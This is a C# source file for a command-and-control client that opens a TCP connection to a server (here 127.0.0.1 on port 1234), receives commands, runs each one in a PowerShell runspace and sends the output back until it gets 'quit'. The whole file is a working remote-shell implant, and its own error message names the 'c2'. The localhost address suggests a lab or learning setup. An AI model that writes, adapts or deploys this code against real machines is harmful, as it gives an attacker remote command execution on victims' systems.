using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;


namespace Client
{
    internal class Program
    {   
        public string GetResult(string Cmd)
        {
            String Result= "";
            RunspaceConfiguration rc = RunspaceConfiguration.Create();

            Runspace runspace = RunspaceFactory.CreateRunspace(rc);
            runspace.Open();

            PowerShell powerShell = PowerShell.Create();
            powerShell.Runspace = runspace;

            powerShell.AddScript(Cmd);

            StringWriter stringWriter = new StringWriter();

            Collection<PSObject> po =  powerShell.Invoke();


            foreach (PSObject p in po)
            {
                stringWriter.WriteLine(p.ToString());

            }
            Result = stringWriter.ToString();

            if (Result == "")
            {
                return "Error Check the c2";
            }

            return Result;

        }


        static void Main(string[] args)
        {

            Program p = new Program();

            int BufferSize = 2048;
            IPAddress ServerIP = IPAddress.Parse("127.0.0.1");
            IPEndPoint ipe = new IPEndPoint(ServerIP, 1234);
            Socket cs = new Socket(ServerIP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            cs.Connect(ipe);
            string msg;
            byte[] buffer = new byte[BufferSize];

            Array.Clear(buffer, 0, buffer.Length);

            cs.Receive(buffer);

            msg = Encoding.ASCII.GetString(buffer).Trim('\0');
            string result;
           
            while (msg != "quit")
            {
                Console.WriteLine("[+] Recevied From the Server: {0}", msg);
                result = p.GetResult(msg);

                cs.Send(Encoding.ASCII.GetBytes(result));
                Array.Clear(buffer, 0, buffer.Length);
                cs.Receive(buffer);
                msg = Encoding.ASCII.GetString(buffer).Trim('\0');
               



            }
            cs.Close();

            //Console.ReadKey();


             

        }
    }
}
